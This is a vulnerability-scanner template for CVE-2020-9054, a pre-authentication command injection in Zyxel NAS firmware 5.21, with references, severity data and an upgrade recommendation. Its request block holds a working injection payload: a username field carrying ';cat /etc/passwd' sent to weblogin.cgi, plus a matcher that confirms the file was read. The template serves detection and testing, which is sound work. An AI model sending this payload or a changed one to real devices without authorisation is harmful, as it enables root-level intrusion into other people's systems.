id: CVE-2020-9054
info:
  name: Zyxel NAS Firmware 5.21- Remote Code Execution
  author: dhiyaneshDk
  severity: critical
  description: A pre-authentication command injection vulnerability in Zyxel NAS Firmware
    5.21 allows a remote, unauthenticated attacker to execute arbitrary code on a
    vulnerable device, potentially leading to remote code execution with root privileges,
    by sending a specially-crafted HTTP POST or GET request, which can be triggered
    even if the attacker does not have direct connectivity to the device, compromising
    any reachable device, and affecting several Zyxel models.
  reference:
  - https://krebsonsecurity.com/2020/02/zyxel-fixes-0day-in-network-storage-devices/
  - https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml
  - https://nvd.nist.gov/vuln/detail/CVE-2020-9054
  - https://kb.cert.org/vuls/id/498544/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-9054
    cwe-id: CWE-78
  tags: cve,cve2020,rce,zyxel,injection,kev
  metadata:
    impact: The CVE-2020-9054 vulnerability in Zyxel NAS firmware version 5.21 can
      allow a remote, unauthenticated attacker to execute arbitrary code with root
      privileges, potentially compromising any affected device reachable from the
      client system.
    recommendation: It is recommended that users of Zyxel NAS devices upgrade to the
      latest firmware version to mitigate the CVE-2020-9054 vulnerability and prevent
      potential remote code execution attacks.
requests:
- method: GET
  path:
  - '{{BaseURL}}/cgi-bin/weblogin.cgi?username=admin'';cat /etc/passwd'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
